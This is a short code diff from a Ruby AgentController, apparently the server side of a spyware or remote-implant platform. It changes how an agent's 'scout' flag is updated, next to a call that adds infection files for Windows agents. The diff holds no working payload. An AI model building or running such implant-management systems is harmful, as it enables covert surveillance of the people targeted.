@@ -311,8 +311,11 @@ class AgentController < RESTController
 
         # add the files needed for the infection module
         agent.add_infection_files if agent.platform == 'windows'
+      end
 
-        agent.scout = false
+      # update the scout flag
+      if agent.scout != scout
+        agent.scout = scout
         agent.save
       end
 
